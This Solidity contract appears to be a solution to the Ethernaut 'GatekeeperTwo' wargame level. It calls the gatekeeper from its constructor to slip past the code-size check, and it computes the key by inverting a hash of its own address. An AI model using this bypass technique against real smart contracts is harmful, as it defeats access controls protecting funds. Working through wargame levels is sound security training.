// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GateKeeperTwo.sol";

contract GateInTwo {
    GatekeeperTwo gateKeeper;

    constructor(address _gateAddress) {
        gateKeeper = GatekeeperTwo(_gateAddress);
        bytes8 _key = ~bytes8(keccak256(abi.encodePacked(address(this))));
        gateKeeper.enter(_key);
    }
}
